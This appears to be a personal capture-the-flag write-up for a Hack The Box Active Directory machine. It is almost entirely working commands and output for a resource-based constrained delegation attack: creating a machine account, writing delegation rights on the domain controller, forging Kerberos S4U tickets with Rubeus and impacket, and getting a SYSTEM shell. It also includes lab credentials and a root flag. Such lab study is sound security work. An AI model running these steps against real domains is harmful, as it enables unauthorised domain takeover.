```bash
evil-winrm -i 10.129.230.181 -u 'support' -p 'Ironside47pleasure40Watchful'
```

# BloodHound

Collect data:
```bash
sudo bloodhound-ce-python -d support.htb -ns 10.129.230.181 -u 'support' -p 'Ironside47pleasure40Watchful' -c all
```

The user "support" is a member of "Shared Support Accounts" which has "GenericAll" on the DC:
![[Pasted image 20251205115415.png]]

# RBCD Exploit

Grep scripts/tools:
```bash
cp ~/Hacking/scripts/Powermad.ps1 .
cp ~/Hacking/scripts/PowerView.ps1 .
cp ~/Hacking/tools/Rubeus.exe .
```

Connect via evil-winrm and import scripts:
```bash
evil-winrm -i 10.129.230.181 -u 'support' -p 'Ironside47pleasure40Watchful' -s .

> Powermad.ps1
> PowerView.ps1
> upload /home/kali/HTB/machines/Support/Rubeus.exe
```

Create machine:
```powershell
New-MachineAccount -MachineAccount COMPUTAAA -Password $(ConvertTo-SecureString 'P4ssword123!' -AsPlainText -Force)
# [+] Machine account COMPUTAAA added
```

Add delegation privs for computer COMPUTAA to the DC computer:
```powershell
$sid = Get-DomainComputer -Identity COMPUTAAA -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($sid))"
$SDbytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDbytes,0)
Get-DomainComputer -Identity 'DC' | Set-DomainObject -Set @{'msDS-AllowedToActOnBehalfOfOtherIdentity'=$SDBytes}
```

Check:
```powershell
Get-DomainComputer -Identity DC | Get-DomainObject | select 'msDS-AllowedToActOnBehalfOfOtherIdentity'

# msds-allowedtoactonbehalfofotheridentity
# ----------------------------------------
# {1, 0, 4, 128...}
```
=> Success

Calculate NTLM hash:
```powershell
.\Rubeus.exe hash /domain:support.htb /user:COMPUTAAA$ /password:'P4ssword123!'

# [*] Action: Calculate Password Hash(es)

# [*] Input password             : P4ssword123!
# [*] Input username             : COMPUTAAA$
# [*] Input domain               : support.htb
# [*] Salt                       : SUPPORT.HTBhostcomputaaa.support.htb
# [*]       rc4_hmac             : A9A70FD4DF48FBFAB37E257CFA953312
# [*]       aes128_cts_hmac_sha1 : C13FE7D4AC711D1725D47307263E0D0F
# [*]       aes256_cts_hmac_sha1 : C32737129F5A022897AA4E86A33A099D12BCCBA5C2CA0BFB736CBADEF77CF6E3
# [*]       des_cbc_md5          : C26702260E852AAE
```
=> rc4_hmac: A9A70FD4DF48FBFAB37E257CFA953312

Requesting a ticket:
```powershell
.\Rubeus.exe s4u /user:COMPUTAAA$ /rc4:A9A70FD4DF48FBFAB37E257CFA953312 /impersonateuser:Administrator /msdsspn:CIFS/support.htb /outfile:administrator.kirbi

# [X] KRB-ERROR (7) : KDC_ERR_S_PRINCIPAL_UNKNOWN
```
=> the SPN `CIFS/support.htb` is not configured on the DC.

List all SPNs on the DC:
```bash
ldapsearch -H ldap://dc.support.htb -D 'support@support.htb' -w 'Ironside47pleasure40Watchful' -b "dc=support,dc=htb" '(&(objectClass=computer)(CN=DC))' servicePrincipalName
```
=> Try again with SPN `HOST/dc.support.htb`

Requesting a ticket:
```powershell
.\Rubeus.exe s4u /user:COMPUTAAA$ /rc4:A9A70FD4DF48FBFAB37E257CFA953312 /impersonateuser:Administrator /msdsspn:HOST/dc.support.htb /outfile:administrator.kirbi

# [*] Ticket written to administrator_HOST_dc.support.htb.kirbi
```

Download to kali:
```
download administrator_HOST_dc.support.htb.kirbi
```

Convert kirbi -> ccache format:
```bash
impacket-ticketConverter administrator_HOST_dc.support.htb.kirbi ticket.ccache
```

Run command on DC:
```bash
KRB5CCNAME=./ticket.ccache impacket-psexec -k -no-pass administrator@dc.support.htb

# C:\Windows\system32> whoami
# nt authority\system
```
BWAM!

Root flag:
```powershell
type C:\Users\Administrator\Desktop\root.txt
# 3c7ad05314696f3bd2f8708c2f7fbe7a
```

---
# (Alternative) RBCD attack via linux tools

Add computer:
```bash
ldapmodify -H ldap://dc.support.htb -D 'support@support.htb' -w 'Ironside47pleasure40Watchful' -f new_computer.ldif -Z
# Failed

impacket-addcomputer 'support.htb/support':'Ironside47pleasure40Watchful'@dc.support.htb -computer-name COMPUTAAA -computer-pass 'P4ssword123!' -domain-netbios SUPPORT -method SAMR
# Failed
```
=> LDAPS/ STARTTLS not available, SMB auth failed

Created computer via evil-winrm Powermad.ps1.

Check if computer was created:
```bash
ldapsearch -H ldap://dc.support.htb -D 'support@support.htb' -w 'Ironside47pleasure40Watchful' -b "dc=support,dc=htb" '(&(objectClass=computer)(CN=COMPUTAAA))'
```
=> COMPUTAAA is there

Modify `msDS-AllowedToActOnBehalfOfOtherIdentity`: 
```bash
impacket-rbcd -delegate-from 'COMPUTAAA$' -delegate-to 'DC$' -action write -dc-ip 10.129.5.60 'support':'Ironside47pleasure40Watchful'

# [*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
# [*] Delegation rights modified successfully!
# [*] COMPUTAAA$ can now impersonate users on DC$ via S4U2Proxy
# [*] Accounts allowed to act on behalf of other identity:
# [*]     COMPUTAAA$   (S-1-5-21-1677581083-3380853377-188903654-6101)
```

Request ticket:
```bash
impacket-getST 'support.htb/COMPUTAAA$' -hashes ':A9A70FD4DF48FBFAB37E257CFA953312' \
    -spn 'HOST/dc.support.htb' \ 
    -impersonate administrator \
    -dc-ip 10.129.5.60
# Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

# [-] CCache file is not found. Skipping...
# [*] Getting TGT for user
# [*] Impersonating administrator
# [*] Requesting S4U2self
# [*] Requesting S4U2Proxy
# [*] Saving ticket in administrator@HOST_dc.support.htb@SUPPORT.HTB.ccache
```

Exec command on DC:
```bash
KRB5CCNAME=./administrator@HOST_dc.support.htb@SUPPORT.HTB.ccache impacket-psexec -k -no-pass administrator@dc.support.htb
```